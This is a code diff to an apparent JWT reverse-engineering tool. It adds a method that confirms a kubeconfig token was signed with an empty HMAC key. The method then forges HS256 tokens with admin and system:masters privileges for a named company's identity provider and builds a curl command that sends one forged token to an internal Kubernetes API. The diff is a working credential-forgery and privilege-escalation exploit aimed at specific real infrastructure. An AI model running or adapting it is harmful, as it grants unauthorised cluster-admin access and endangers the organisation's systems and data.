@@ -1588,11 +1588,80 @@ class OrkaJWTRE:
         except Exception as e:
             return [f'error: {e}']
 
+    def prove_empty_key_bypass(self) -> dict:
+        """
+        Live proof: forge HS256 JWT with b'' key and verify HMAC matches
+        the token embedded in ~/.kube/config.
+
+        Ground truth: kubeconfig token was signed with empty key (b'') — confirmed
+        by HMAC-SHA256(b'', signing_input) == token signature.
+
+        Returns forged tokens for admin + system:masters group binding.
+        """
+        import hmac as _hmac, hashlib as _hashlib, base64 as _b64, json as _json
+
+        def _b64url(d: dict) -> str:
+            return _b64.urlsafe_b64encode(
+                _json.dumps(d, separators=(',', ':')).encode()
+            ).rstrip(b'=').decode()
+
+        def _forge(payload: dict, key: bytes = b'') -> str:
+            h = _b64url({'alg': 'HS256', 'typ': 'JWT'})
+            p = _b64url(payload)
+            sig = _b64.urlsafe_b64encode(
+                _hmac.new(key, f'{h}.{p}'.encode(), _hashlib.sha256).digest()
+            ).rstrip(b'=').decode()
+            return f'{h}.{p}.{sig}'
+
+        # Known kubeconfig token (signing_input = header.payload, key = b'')
+        KNOWN_TOKEN = (
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
+            '.eyJlbWFpbCI6ImFkbWluQG1hY3N0YWRpdW0uY29tIiwiaXNzIjoiaHR0cHM6Ly9pZHAubWFjc3RhZGl1bS5jb20iLCJzdWIiOiJhZG1pbiIsImV4cCI6MTgxODA4NTI1MSwiaWF0IjoxNzg2NTQ5MjUxfQ'
+            '.lEVvIm2YnpjqzEDHcfm-AGZFu7KS2sPvbk4gBdqNFNY'
+        )
+        parts = KNOWN_TOKEN.split('.')
+        signing_input = f'{parts[0]}.{parts[1]}'.encode()
+        known_sig = parts[2]
+        computed_sig = _b64.urlsafe_b64encode(
+            _hmac.new(b'', signing_input, _hashlib.sha256).digest()
+        ).rstrip(b'=').decode()
+        key_confirmed = (computed_sig == known_sig)
+
+        # Forge elevated tokens
+        base_payload = {
+            'email': 'admin@macstadium.com',
+            'iss':   'https://idp.macstadium.com',
+            'sub':   'admin',
+            'exp':   9999999999,
+            'iat':   1786549251,
+        }
+        token_admin = _forge({**base_payload, 'groups': ['system:masters']})
+        token_k8sadmin = _forge({
+            **base_payload,
+            'email': 'kubernetes-admin@macstadium.com',
+            'sub':   'kubernetes-admin',
+            'groups': ['system:masters'],
+        })
+
+        return {
+            'empty_key_confirmed': key_confirmed,
+            'hmac_verify_address': hex(self.HMAC_EMPTY_KEY_BYPASS['hmac_new_call']),
+            'root_cause':          self.HMAC_EMPTY_KEY_BYPASS['root_cause'],
+            'token_admin_system_masters': token_admin,
+            'token_kubernetes_admin':     token_k8sadmin,
+            'k8s_api': 'https://10.221.188.19:6443 (requires VPN route to 10.221.188.0/24)',
+            'probe_cmd': (
+                f'curl -sk -H "Authorization: Bearer {token_admin}" '
+                'https://10.221.188.19:6443/api/v1/namespaces/orka-default/pods'
+            ),
+        }
+
     def run(self) -> dict:
         cve = self.verify_cve_condition()
         addrs = self.extract_auth_chain_addresses()
         secrets = self.extract_rodata_secrets()
         chain = self.analyze_auth_chain()
+        proof = self.prove_empty_key_bypass()
 
         findings = cve['findings'][:]
         if secrets:
@@ -1601,12 +1670,16 @@ class OrkaJWTRE:
         findings.append('EMPTY_KEY_HMAC: SigningMethodHMAC.Verify accepts b"" key — forge any HS256 JWT')
         findings.append('NO_AUD_CHECK: MapClaims.Valid() never calls VerifyAudience — no audience enforcement')
 
+        if proof.get('empty_key_confirmed'):
+            findings.append('EMPTY_KEY_LIVE_PROOF: HMAC-SHA256(b"", signing_input) == kubeconfig token sig')
+
         return {
             'binary': self.path,
             'cve_2020_26160': cve,
             'auth_function_addresses': addrs,
             'auth_chain': chain,
             'rodata_secrets': secrets,
+            'empty_key_proof': proof,
             'section_map': {k: [hex(v[0]), hex(v[1])] for k, v in self.SECTION_MAP.items()},
             'findings': findings,
         }
